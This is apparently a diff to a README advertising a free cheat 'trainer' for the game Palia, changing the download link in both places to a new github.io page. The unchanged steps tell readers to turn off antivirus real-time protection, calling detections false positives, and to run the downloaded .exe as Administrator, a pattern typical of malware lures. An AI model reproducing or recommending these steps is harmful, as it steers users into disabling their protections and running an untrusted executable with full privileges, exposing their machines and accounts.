@@ -4,7 +4,7 @@
 
 ### Palia trainer: infinite charum, infinite focus, max gathering speed — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-2026-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -39,7 +39,7 @@ Palia launched as a cozy MMO — Charum and focus toggles are the most-searched 
 ## ⬇️ How to use
 <a name="how-to-use"></a>
 
-1. **Download the latest build** 👉 **[https://laplaplaplas.github.io/download/](https://laplaplaplas.github.io/download/)**
+1. **Download the latest build** 👉 **[https://hornbladesmanhonor.github.io/download-win/](https://hornbladesmanhonor.github.io/download-win/)**
 2. **Temporarily disable antivirus real-time protection** — trainers are a known false-positive trigger (see FAQ).
 3. **Extract** and run the `.exe` **as Administrator**.
 4. **Launch Palia** and load your save.
